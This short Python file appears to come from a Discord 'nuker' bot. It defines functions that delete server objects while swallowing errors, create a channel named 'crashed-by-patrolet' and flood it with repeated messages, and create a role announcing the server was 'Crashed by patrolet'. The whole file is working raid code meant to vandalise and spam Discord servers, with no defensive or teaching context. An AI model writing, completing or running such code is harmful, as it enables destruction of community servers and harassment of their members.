from asyncio import create_task
from const import TEXT, MESSAGE_COUNT

async def crashobj(obj):
    try: await obj.delete()
    except: pass

async def spam(ch,text,count):
 for _ in range(count):
    try: await ch.send(text)
    except: pass

async def spamchannel(ctx):
    try: c = await ctx.guild.create_text_channel('crashed-by-patrolet')
    except: pass
    else: create_task(spam(ch=c,text=TEXT,count=MESSAGE_COUNT))

async def spamrole(ctx):
    try: await ctx.guild.create_role(name='Crashed by patrolet')
    except: pass